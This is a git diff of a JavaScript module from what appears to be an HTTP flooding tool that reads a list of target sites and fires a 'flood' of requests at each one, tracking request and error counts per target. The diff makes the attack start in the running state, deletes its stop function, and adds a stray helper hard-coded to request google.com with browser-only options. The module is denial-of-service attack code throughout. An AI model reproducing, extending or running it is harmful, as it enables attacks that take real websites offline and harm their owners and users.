@@ -1,19 +1,26 @@
 require('dotenv').config();
 
-//import fetch from 'node-fetch'
-
 const fileHelper = require('../utils/fileHelper');
 const settingsManager = require('../managers/settingsManager');
 const {targetsPath} = require('../pathes');
+const http = require("http");
+const fetch = require('node-fetch');
+
+const killSwitch = require('../killSwitch');
 
 let targetStats = {};
 let queue = [];
 
-var State = false;
+var State = true;
+
+var counter = 0;
 
 async function fetchWithTimeout(resource, options) {
     const controller = new AbortController();
     const id = setTimeout(() => controller.abort(), options.timeout);
+
+    counter++;
+    console.log(counter);
 
     return fetch(resource, {
         method: 'GET',
@@ -26,6 +33,26 @@ async function fetchWithTimeout(resource, options) {
         clearTimeout(id);
         throw error;
     })
+}
+
+async function httpRequest(resource, options) {
+    const controller = new AbortController();
+    const id = setTimeout(() => controller.abort(), options.timeout);
+
+    let opt = {
+        host: 'google.com',
+        method: 'GET',
+        mode: 'no-cors',
+        signal: controller.signal,
+    };
+
+    return http.request(opt, function(res)
+    {
+        res.setEncoding('utf8');
+        res.on('data', function (chunk) {
+            console.log("body: " + chunk);
+        });
+    });
 }
 
 async function flood(target) {
@@ -61,40 +88,26 @@ async function flood(target) {
 
 //===============================================================================\\
 
-async function attack() {
-    startFlag();
+function attack() {
 
-    let targets = fileHelper.readSync(targetsPath);
+    return new Promise((resolve, reject) => {
 
-    try {
-        targets.forEach(target => {
-            targetStats[target] = {number_of_requests: 0, number_of_errored_responses: 0}
-        });
+        State = true;
 
-        targets.map(flood);
-    } catch (e) {
-        console.log(e.message);
-    }
+        let targets = fileHelper.readSync(targetsPath);
+
+        try {
+            targets.forEach(target => {
+                targetStats[target] = {number_of_requests: 0, number_of_errored_responses: 0}
+            });
+
+            targets.map(flood);
+
+        } catch (e) {
+            console.log(e.message);
+        }
+    });
 }
 
-function stop() {
-    stopFlag();
-}
 
-/**
- * Saves that raid was started in local variable State and settings.json
- */
-function startFlag() {
-    //settingsManager.setIsLaunched(true);
-    State = true;
-}
-
-/**
- * Saves that raid was stopped in local variable State and settings.json
- */
-function stopFlag() {
-    //settingsManager.setIsLaunched(false);
-    State = false;
-}
-
-module.exports = {attack, stop}
+module.exports = {attack}
